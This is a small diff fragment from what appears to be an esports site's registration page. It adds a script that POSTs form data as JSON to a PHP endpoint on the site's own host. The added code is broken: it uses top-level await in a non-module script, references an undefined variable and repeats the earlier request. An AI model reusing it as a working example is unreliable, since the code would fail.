@@ -183,5 +183,10 @@
     let result = await response.json();
     alert(result.message);
 });</script>
+    <script>let response = await fetch("https://x4esports.42web.io/regdata.php", {
+    method: "POST",
+    body: JSON.stringify(data),
+    headers: { "Content-Type": "application/json" }
+});</script>
   </body>
 </html>
